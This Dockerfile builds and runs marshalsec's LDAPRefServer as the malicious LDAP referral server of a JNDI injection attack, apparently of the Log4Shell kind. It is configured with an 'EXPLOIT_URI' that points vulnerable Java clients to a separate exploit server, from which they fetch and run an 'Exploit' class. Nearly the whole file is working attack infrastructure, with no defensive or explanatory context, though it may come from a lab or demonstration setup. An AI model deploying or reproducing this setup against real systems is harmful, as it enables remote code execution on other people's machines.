# Build stage
FROM maven AS build
    WORKDIR /app
    # Copy source code and build artifact 'ldap_server-1.0-all.jar'
    COPY . . 
    RUN mvn clean package -DskipTests

# Run stage
FROM openjdk:19-buster
    WORKDIR /app
    COPY --from=build /app/target/ldap_server-1.0-all.jar .
    ARG EXPLOIT_SERVER=my_exploit_server
    ARG EXPLOIT_SERVER_PORT=9090
    ENV EXPLOIT_URI="http://${EXPLOIT_SERVER}:${EXPLOIT_SERVER_PORT}/#Exploit"
    ENTRYPOINT java -cp ldap_server-1.0-all.jar marshalsec.jndi.LDAPRefServer $EXPLOIT_URI